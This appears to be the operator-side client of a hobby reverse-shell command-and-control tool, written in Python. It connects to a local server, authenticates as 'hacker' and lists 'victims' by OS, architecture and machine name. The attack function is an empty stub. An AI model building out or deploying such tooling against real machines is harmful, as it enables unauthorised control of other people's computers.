import socket
import reverse_shell.consts as ct
import reverse_shell.utils as ut
import platform
import json
from sys import exit
from reverse_shell.hacker import cli


def initiate():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    addr = ('localhost', ct.SERVER_PORT)
    sock.connect(addr)
    return sock


def send_computer_info(sock):
    my_system = platform.uname()
    os = my_system.system
    arch = my_system.machine
    computer_info = json.dumps({"os": os, "arch": arch, "name": my_system.node})  # Serialize the computer info
    ut.send_message(computer_info, sock)


def send_verification(sock):
    ut.send_message("hacker", sock)
    verification_message = ut.receive_message(sock)

    if verification_message == ct.UNVERIFIED_MESSAGE:
        ut.log("error", "Verification failed! exiting...")
        exit(1)

    else:
        ut.log("success", "Verification Succeeded!")


def attack(victim_id, sock):
    pass


def list_victims(sock, os=None, arch=None, name=None):
    print_form = """{0}
        COMPUTER NAME: {1} 
        OS: {2}
        ARCHITECTURE: {3}"""

    try:
        ut.send_message("get_victims", sock)

        victims = ut.receive_message(sock)
        if victims is not None:
            victims = json.loads(victims)
            # Filter the victims according to the args
            victims = {x: y for x, y in victims.items() if y['os'] == os or os is None if y['name'] == name or name is None if y['arch'] == arch or arch is None}
            for id in victims:
                victim = victims[id]
                print()
                print(print_form.format(id, victim['name'], victim['os'], victim['arch']))
            print()
    except BrokenPipeError:
        # May be some kind of connection error might happens so
        # we need to notify the hacker
        ut.log("error", "connection with the server has been lost!")


def start():
    try:
        sock = initiate()
    except IOError:
        ut.log("error", "IOerror occurred, Server might be offline")
        exit(1)

    # Verifying the client
    send_verification(sock)

    commands_with_funcs = {
        "attack": (attack, 1, [], [sock]),
        "list-victims": (list_victims, 0, ["os", "arch", "name"], [sock])
    }

    connected = True

    while connected:
        cli.initiate(additional_commands=commands_with_funcs)

    ut.log("disconnected", "Disconnected with the server.")


if __name__ == "__main__":
    start()
